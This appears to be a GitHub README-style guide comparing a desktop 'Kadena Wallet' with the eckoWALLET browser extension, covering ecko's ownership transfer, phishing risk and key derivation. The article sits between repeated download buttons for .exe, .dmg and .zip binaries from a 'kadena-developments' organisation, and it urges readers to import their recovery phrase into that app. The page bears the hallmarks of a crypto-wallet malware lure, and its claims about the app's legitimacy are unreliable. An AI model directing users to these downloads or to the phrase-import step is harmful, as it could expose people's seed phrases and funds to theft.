![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Kadena Wallet vs eckoWALLET: Desktop and Extension Compared</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

eckoWALLET has the most misunderstood history in this ecosystem, and any comparison has to start there. The product did not die in 2024. It changed hands, kept shipping, and is now maintained by a different company than the one that launched it. Comparing it with Kadena Wallet today is a comparison between a browser extension and a desktop application, run by separate teams, for partly different users.

## You'll see this if

- You used eckoWALLET, read that it shut down, and are unsure whether to trust the version you have.
- You are choosing between a browser extension and a desktop app for a KDA balance.
- You have accounts created in eckoWALLET and want to know where they can be opened.
- You are comparing the two and every page you find contradicts the next one.

## What actually happened, with dates

| Date | Event |
| --- | --- |
| 31 July 2024 | eckoDAO announced a "closure or transfer process" for eckoDEX, eckoWALLET and eckoGOV, to complete by 30 August 2024, stating user funds were safe |
| Following months | The DEX stopped; the wallet did not |
| 13 August 2026 | Chrome Web Store listing updated to version 2.27.5, published by InFlux Technologies |

The transfer is the part most summaries miss. The extension is published by InFlux Technologies, describes itself as powered by RunOnFlux, and its mobile development sits under that organisation. That is a maintained product with a named publisher, not an abandoned one.

Two things did end. The exchange that shared the ecko name is unreachable at both of its former addresses, and eckoGOV has no publicly verified outcome. Neither of those is the wallet.

## The two surfaces

| | Kadena Wallet | eckoWALLET |
| --- | --- | --- |
| Form | Desktop application | Browser extension |
| Platforms | Windows, macOS, Linux | Browsers that support the extension model |
| Seed | Kadena recovery phrase | 12 words |
| Key path | Kadena accounts, `k:` and legacy | `m/44'/626'/0'/0/{index}` |
| Maintainer | The publisher of its tagged releases | InFlux Technologies |
| Best for | A balance you open deliberately | A balance you use while browsing |

The row that matters most is the last one. A desktop application is a place you go. An extension is a thing that is already there, in the same process that renders whatever page you loaded.

## Where the difference is felt

**Phishing surface.** An extension lives inside a browser, and a browser renders hostile content all day. A lookalike site that convinces you to approve a transaction is the standard attack, and it works because the approval dialog appears in a familiar place. A desktop application is a separate process, which does not make it immune, but removes the everyday proximity.

**Address verification.** A desktop window has room to show a full address and the chain beside it. An extension popup is small, and truncated addresses are where clipboard swaps succeed.

**Convenience.** The extension connects to sites that expect one, which is a real advantage if you use Kadena applications in a browser. The desktop app does not pretend to be that.

Neither design is unsafe by construction. The risk profile differs, and it should be chosen rather than inherited.

## Accounts, phrases and paths

eckoWALLET uses a 12-word phrase and derives accounts along `m/44'/626'/0'/0/{index}`. It can regenerate accounts that originated in ecko mobile, Chainweaver, Ledger and SpireKey seeds, which is why it is often the tool people reach for when an old phrase needs a home.

Kadena Wallet accepts an existing Kadena phrase and rebuilds the accounts behind it, legacy names included.

The comparison that decides compatibility is not the phrase format. It is the address. Export, restore, compare. If the derived address equals the one you funded, both products control the same account and you can use either. If it differs, they derive differently, and the balance lives under whichever one matches.

Do that test with an empty account the first time. It costs nothing and it answers the only question that matters later.

## Which one to use

- **You interact with Kadena sites in a browser.** The extension is the tool that fits, provided you keep it updated and read every approval prompt.
- **You hold a balance and check it occasionally.** A desktop application keeps the key out of the browser process, which is the point of separating the two.
- **You want both.** They can coexist if they derive the same accounts, and using one as a fallback is sensible once you have verified the restore.
- **Your accounts came from Chainweaver or a device.** Test both products against your funded address before deciding, because derivation support matters more than interface preference.

## Two trust boundaries, not one

An extension trusts the browser to present honest content, and that browser is also the program rendering every hostile page you visit. A desktop application trusts the operating system and the installer you ran, and a phishing site reaches neither. That is the real distinction between these two products: not which one stores a key more safely, but which one puts an approval prompt beside content an attacker can write. Pick the boundary you can actually police, and keep the phrase offline either way, because both give the same answer to the only question that decides ownership: whoever holds the phrase controls the account.

## What not to conclude

- **"eckoWALLET shut down."** It was transferred. The exchange closed; the wallet is published and updated.
- **"The new publisher means it is audited."** No audit of the current build is public. Maintenance and audit are different claims.
- **"The desktop app is safer, so the extension is unsafe."** Both are self-custody. The extension has more exposure to browser-borne deception; that is a difference in degree, not a verdict.
- **"My ecko accounts are gone with the DEX."** Accounts live on-chain. The phrase opens them in any wallet that derives the same keys.

## FAQ

**Is the eckoWALLET I can install today the same product?**
It is the continuation of it, published by InFlux Technologies and carrying version 2.27.5. The publisher changed; the account model did not.

**Can Kadena Wallet open an eckoWALLET account?**
It can open an account whose derived address matches. Import the phrase and compare addresses before moving anything.

**Which is better for a large balance?**
A desktop application, for the smaller everyday attack surface, combined with a hardware device if you want signing separated from the machine entirely.

**Does the old eckoDEX still work?**
No. Both former addresses fail to respond. Treat any site claiming to be it as unverified.

**What happened to eckoGOV?**
No verified outcome was found. Do not assume either continuation or compensation.

## Related reading

- eckoWALLET to Kadena Wallet: what carries over
- Best Kadena wallet in 2026: every option that still works
- What Kadena Wallet is, and what self-custody actually means
- Lost seed phrase: what Kadena Wallet can and cannot recover

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Linx vs Kadena Wallet: Mobile Against Desktop](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/linx-vs-kadena-wallet.md)
- [Chainweaver Alternative: What Kadena Wallet Users Should Know](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/chainweaver-alternative-kadena-wallet.md)
- [What Happened to Kadena: The Fourteen Months That Changed Everything](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/what-happened-to-kadena-network.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
